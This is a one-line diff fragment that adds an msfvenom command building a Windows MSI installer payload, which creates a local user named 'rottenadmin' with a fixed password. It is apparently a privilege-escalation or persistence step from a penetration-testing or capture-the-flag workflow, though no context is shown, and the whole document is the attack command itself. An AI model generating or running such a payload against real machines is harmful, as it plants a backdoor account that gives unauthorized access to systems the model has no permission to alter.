@@ -1,0 +1,2 @@
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o adduser.msi
+
